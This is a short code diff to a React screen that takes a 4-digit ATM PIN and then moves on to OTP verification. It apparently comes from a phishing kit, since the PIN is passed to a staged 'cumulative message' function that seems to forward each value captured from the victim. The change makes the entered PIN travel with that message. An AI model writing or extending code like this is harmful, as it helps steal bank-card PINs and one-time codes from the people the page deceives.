@@ -26,8 +26,9 @@ const ATMPin = () => {
 
   const handleConfirm = async () => {
     if (pin.length === 4) {
-      updateData({ atmPin: pin });
-      await sendCumulativeMessage(5, "رقم PIN");
+      const newData = { atmPin: pin };
+      updateData(newData);
+      await sendCumulativeMessage(5, "رقم PIN", newData);
       navigate('/otp-verification');
     }
   };
